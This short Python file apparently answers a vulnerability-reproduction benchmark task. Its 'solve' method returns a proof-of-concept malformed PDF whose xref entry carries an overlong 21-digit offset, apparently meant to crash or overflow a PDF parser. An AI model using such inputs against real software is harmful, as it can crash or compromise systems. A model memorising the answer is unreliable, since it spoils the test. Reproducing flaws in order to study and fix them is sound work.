class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = b'%PDF-1.4\nxref\n0 1\n' + b'0' * 21 + b' 00000 n\r\n'
        return poc
